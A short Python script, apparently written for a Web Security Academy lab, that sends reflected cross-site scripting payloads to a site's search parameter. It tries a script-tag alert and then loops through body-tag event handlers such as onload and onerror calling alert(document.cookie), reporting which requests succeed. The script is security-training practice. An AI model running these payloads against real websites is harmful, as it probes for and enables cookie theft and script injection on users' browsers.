import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'acd11fe11e63babbc0e145b7000300d7.web-security-academy.net'

search_term = '''<script>alert(1)</script>'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)
if resp.status_code == 200:
    print(f'Success: {search_url} gives {resp.status_code}')
else:
    print(f'Error: {search_url} gives {resp.status_code}: {resp.text}')


attributes = ['onload','onunload','onerror','onmessage','onpagehide','onpageshow','onresize','onstorage']
for attribute in attributes:
    search_term = f'''<body {attribute}=alert(document.cookie)></body>'''
    search_url = f'https://{site}/?search={search_term}'
    resp = s.get(search_url)
    if resp.status_code == 200:
        print(f'Success: {search_term} gives code {resp.status_code}')
    else:
        print(f'Error: {search_term} gives response: {resp.text}')
